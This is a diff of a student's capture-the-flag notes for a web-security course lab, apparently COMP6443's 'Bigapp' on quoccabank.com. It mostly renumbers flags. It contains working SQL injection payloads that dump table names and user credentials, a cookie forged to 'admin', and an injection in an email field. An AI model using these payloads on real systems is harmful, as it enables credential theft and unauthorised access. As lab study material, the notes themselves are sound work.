@@ -36,7 +36,7 @@ qdns.quoccabank.com -> hypothesise that it is a nosql injection
 
 # Bigapp
 
-flag 1 
+flag 1,2 
 login
 
 
@@ -50,7 +50,7 @@ change cookie to Rae.Salley@miller.com:admin and encode base64
 COMP6443{GET_BY_WITH_BYPASS.Redacted}
 
 
-flag 2
+flag 3
 
 in burp suite repeater
 this route
@@ -61,7 +61,7 @@ sends a correct response.
 
 leaking table name and column name in 1 query:
 
-a'))+union+select+table_name,column_name,3,4,5,6+from+information_schema.columns-+
+a'))+union+select+table_name,column_name,3,4,5,6+from+information_schema.columns--+
 
 leaking all user detail
 a'))+union+select+id,fname,type,userid,email,password+from+users--+
@@ -70,7 +70,7 @@ COMP6443{INJECTION_UNION_CHALLENGE.redacted}
 
 
 
-flag 3
+flag 4
 
 found admin account:
 username: admin@quoccabank.com
@@ -80,7 +80,7 @@ COMP6443{LOGIN_USING_ADMIN_CREDS.redacted}
 
 
 
-flag 4
+flag 5
 
 sorting bank products
 injection payload:
@@ -89,11 +89,12 @@ COMP6443{USE_BY_ORDER.redacted}
 
 
 
-flag 5 
+flag 6 
 
 email=jack%40jillmail.com'+and+1=0--+
 trying to use sql injections to bypass the duplicate username
 
 
+flag 7
 
 
